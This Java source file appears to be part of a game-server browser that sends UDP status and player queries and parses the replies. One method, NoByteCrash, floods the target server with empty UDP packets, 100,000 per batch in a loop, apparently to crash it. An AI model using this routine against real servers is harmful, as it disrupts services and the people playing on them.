/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package konsola;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.bind.DatatypeConverter;

/**
 *
 * @author Mateusz
 */
public class Server extends Thread {

    String name;
    String ip;
    int port;
    String ips;
    String map;
    int numpl;
    int maxpl;
    String uptime;
    String time;
    String mapstat;
    boolean crash;
    boolean password;
    DatagramSocket socket;
    List<Player> players;

    boolean stop = false;

    public Server(String ips) {
        try {
            this.ips = ips;
            this.ip = ips.substring(0, ips.indexOf(":"));
            this.port = Integer.parseInt(ips.substring(ips.indexOf(":") + 1));
            this.socket = new DatagramSocket();
        } catch (SocketException ex) {
            Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public Server(Server server) {
        try {
            this.ips = server.ips;
            this.ip = server.ip;
            this.port = server.port;
            this.crash = server.crash;
            this.socket = new DatagramSocket();
        } catch (SocketException ex) {
            Logger.getLogger(Server.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public List<Player> getPlayers() {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = "\\players\\".getBytes();
            DatagramSocket socket = new DatagramSocket();
            socket.setSoTimeout(2000);

            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            buf = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);  //odbieramy komende
            socket.close();
            message = new String(packet.getData());
            message = message.trim();
            //message = message.substring(22,message.length()-4);

        } catch (Exception ex) {
            return null;
        }
        players = new ArrayList<Player>();
        setNewPlayer(message);
        return players;

    }
    
     

    public void setNewPlayer(String status) {

        while (status.lastIndexOf("player") > 0) {
            String pom;
            String id;
            String nick;
            String stats;
            String ping;
            String team;
            String sfrag = "frags_";
            String sdeath = "deaths_";
            String sping = "ping_";
            String steam = "team_";
            String splayer = "player_";
            
            if (status.indexOf(splayer) < 0) {
                return;
            }
            id = status.substring(status.indexOf(splayer) + splayer.length(), status.indexOf("\\", status.indexOf(splayer) + splayer.length()));
            splayer += id + "\\";
            sfrag += id + "\\";
            sdeath += id + "\\";
            sping += id + "\\";
            steam += id + "\\";
            pom = status.substring(status.indexOf(splayer) + splayer.length(), status.indexOf(sfrag) - 1);
            nick = pom;
            pom = status.substring(status.indexOf(sfrag) + sfrag.length(), status.indexOf(sdeath) - 1);
            stats = pom;
            pom = status.substring(status.indexOf(sdeath) + sdeath.length(), status.indexOf(sping) - 1);
            stats += "/" + pom;
            pom = status.substring(status.indexOf(sping) + sping.length(), status.indexOf(steam) - 1);
            ping = pom;
            pom = status.substring(status.indexOf(steam) + steam.length(), status.indexOf(steam) + steam.length() + 1);
            team = pom;
            Player p = new Player(id, nick, stats, ping, team);
            status = status.substring(status.indexOf(splayer)+splayer.length() + 2);
            players.add(p);
        }

    }

    public void run() {
        if (setServer(sendStatus())) {
            Konsola.lista.add(this);
        }
        Konsola.update++;

    }

    public void NoByteCrash() {
        try {
            byte[] msg = DatatypeConverter.parseHexBinary("");
            DatagramPacket packet = null;
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg;
            //socket.setSoTimeout(2000);
            while (!stop && !sendStatus().isEmpty()) {
                DatagramSocket socket = new DatagramSocket();
                for (int i = 0; i < 100000; i++) {
                    socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
                }
                socket.close();
            }

        } catch (Exception ex) {
            System.out.println("pakiet " + ex);
        }
    }

    public String sendStrPck(String msg) {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg.getBytes();
            socket.setSoTimeout(2000);

            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            buf = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);  //odbieramy komende
            message = new String(packet.getData());
            message = message.trim();
            //message = message.substring(22,message.length()-4);

        } catch (Exception ex) {
            System.out.print(".");
        }
        return message;
    }

    public String sendStatus() {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = "\\status\\".getBytes();
            DatagramSocket socket = new DatagramSocket();
            socket.setSoTimeout(2000);

            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            buf = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);  //odbieramy komende
            socket.close();
            message = new String(packet.getData());
            message = message.trim();
            //message = message.substring(22,message.length()-4);

        } catch (Exception ex) {
            return "";
        }
        return message;
    }

    public byte[] sendPck(String str) {
        byte[] msg = DatatypeConverter.parseHexBinary(str);
        DatagramPacket packet = null;
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg;
            socket.setSoTimeout(2000);

            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            buf = new byte[4096];

            packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);  //odbieramy komende

        } catch (Exception ex) {
            System.out.println("pakiet " + ex);
        }
        return packet.getData();
    }

    public String sendHexPck(byte[] msg) {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg;
            socket.setSoTimeout(2000);
            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            byte[] buff = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buff, buff.length);
            socket.receive(packet);  //odbieramy komende

        } catch (Exception ex) {
            System.out.println("pakiet " + ex);
        }
        return message;
    }

    public boolean setServer(String status) {
        if (status.length() <= 0) {
            return false;
        }
        String pom;
        try {
            pom = status.substring(status.indexOf("hostname\\") + 9, status.indexOf("\\hostport"));
            name = pom;
            pom = status.substring(status.indexOf("mapname\\") + 8, status.indexOf("\\gametype"));
            map = pom;
            pom = status.substring(status.indexOf("numplayers\\") + 11, status.indexOf("\\maxplayers"));
            numpl = Integer.parseInt(pom);
            pom = status.substring(status.indexOf("maxplayers\\") + 11, status.indexOf("\\gamemode"));
            maxpl = Integer.parseInt(pom);
            pom = status.substring(status.indexOf("uptime\\") + 7, status.indexOf("\\timeleft"));
            int up;
            up = Integer.parseInt(pom);
            uptime = up / 60 + "h " + up % 60 + "min";
            pom = status.substring(status.indexOf("timeleft\\") + 9, status.indexOf("\\mapstat"));
            time = pom;
            pom = status.substring(status.indexOf("mapstat\\") + 8, status.indexOf("\\timelimit"));
            mapstat = pom;
            pom = status.substring(status.indexOf("password\\") + 9, status.indexOf("\\team_t0"));
            if (pom.equals("1")) {
                password = true;
            } else {
                password = false;
            }
        } catch (StringIndexOutOfBoundsException ex) {
            System.out.println("Info-updateInfo " + ex.toString() + status);
        }
        return true;
    }

    public void info() {
        //System.out.println("====================================");
        System.out.print(ip + " " + port + "  ");
        System.out.print(name + " ");
        System.out.print(uptime + "   ");
        System.out.print(map + "  ");
        System.out.print(numpl + "/" + maxpl + "  ");
        System.out.print(time + " ");
        System.out.println(mapstat + "    ");
        //System.out.println("====================================");
    }

}
